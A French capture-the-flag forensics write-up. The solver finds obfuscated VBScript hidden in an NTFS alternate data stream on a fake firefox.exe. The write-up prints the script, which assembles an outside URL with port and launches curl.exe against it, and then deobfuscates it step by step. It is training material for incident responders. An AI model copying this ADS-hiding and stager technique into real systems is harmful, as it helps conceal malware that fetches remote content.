Notre analyste SOC a enfin eu des congés payés et un bon weekend reposant, il a pu dormir. A l'aide de ses facultés cérébrales retrouvées, il a observé un log intéressant qui commence par :

```
wscript.exe E:\firefox.exe:security_?????.vbs
```

Il ne se rappelle pas que firefox puisse être installé dans ce répertoire et qu'il dispose d'un `security_???.vbs`. L'équipe client n'a pas effectué de tâche d'administration liée à firefox.

Que se passe t il ?

Nous avons récupéré le filesystem à l'aide de la commande suivante :

```
$ sudo dd if=/dev/sda3 of=./suspicious_ntfs_drive.img bs=1M
```

Le flag est au format suivant : nom du fichier vbs, IP contactée, port contacté: leHACK{security_restenomdefichier.vbs_IPcontactée_port}

## Solution

As always, we start with a `file`, as it takes some time to run i've aaaalready ran it :
```
$ file suspicious\_ntfs\_drive.img

suspicious\_ntfs\_drive.img: DOS/MBR boot sector, code offset 0x52+2, OEM-ID "NTFS ", sectors/cluster 8, Media descriptor 0xf8, sectors/track 32, heads 64, hidden sectors 124928, dos < 4.0 BootSector (0x80), FAT (1Y bit by descriptor); NTFS, sectors/track 32, sectors 8191, $MFT start cluster 4, $MFTMirror start cluster 511, bytes/RecordSegment 2^(-1*246), clusters/index block 1, serial number 033ec3e594bc24608
```

C'est marqué que le type de système de fichier est NTFS. De plus, l'énoncé mentionne la ligne de commande invoquée : `wscript.exe E:\firefox.exe:security_?????.vbs` qui contient un `:` on pense donc à un **alternate data stream** (ou pas lol, mais maintenant on y pensera).

Monter le disque avec ntfs-3g et les options permettant de voir les attributs spécifiques aux streams.
```
$ mkdir mount_point

$ sudo mount -t ntfs-3g -o user\_xattr,streams\_interface=xattr,efs\_raw suspicious\_ntfs\_drive.img mount\_point
```
Regarder le contenu du disque :
![c9b0f9314eee850d02aca08f86bc80cc.png](../_resources/c9b0f9314eee850d02aca08f86bc80cc.png)

Consulter les attributs NTFS du fichier avec la commande getfattr :
```
getfattr -d -m ".*" mount_point/firefox.exe
```
![f3a3d70410e5938a5eef687d6b2fc324.png](../_resources/f3a3d70410e5938a5eef687d6b2fc324.png)

On voit du code VBS :
```
user.security_launch.vbs="Dim shl\015\012Set shl = CreateObject(\"Wscript.Shell\")\015\012Dim dest\015\012aaa = replace(\"hello\",\"h\",\"w\")\015\012bbb = StrReverse(\"86\")\015\012ccc = Right(\"90018000\",4)\015\012dest = \"http://\"+chr(49)+\"93.1\"+bbb+\".1.42:\"+ccc+\"/dothethingzuulee\"\015\012Call shl.Run(\"\"\"curl.exe\"\" \"+dest)\015\012Set shl = Nothing\015\012WScript.Quit\015\012'flaag=almostthere"
```

On copie colle et on réécrit proprement. ça donne ça :

```
Set shl = CreateObject("Wscript.Shell")  -> on crée un objet shell
aaa = replace("hello","h","w")     -> remplace h par w dans hello => wello
bbb = StrReverse("86")        -> met la chaine à l'envers => 68
ccc = Right("90018000",4)      -> prends les 4 char à droite => 8000

dest = "http://"+chr(49)    => http://1
+"93.1"                     => http://193.1
+bbb                   => http://193.168
+".1.42:"              => http://193.168.1.42:
+ccc                   => http://193.168.1.42:8000
+"/dothethingzuulee"   => http://193.168.1.42:8000/dothethingzuulee

Call shl.Run("""curl.exe"" "+dest)
Set shl = Nothing
WScript.Quit
flaag=almostthere
```

La comande lancée est `curl http://193.168.1.42:8000/dothethingzuulee` ça fait un `HTTP GET` de la ressource `dothethingzuulee` à l'IP `193.168.1.42` sur le port `8000`.
Pas très réaliste mais j'ai fait de mon mieux.

Donc le flag c'est : `security_launch.vbs_193.168.1.42_8000`

## Pour aller plus loin

Je n'ai aucune idée de comment utiliser le fichier `suspicious_ntfs_drive.img` sous windows.
Les commandes à utiliser sous windows sont  :
```
get-item -path .\firefox.exe -stream *
get-content -path .\firefox.exe -stream security_launch.vbs
```
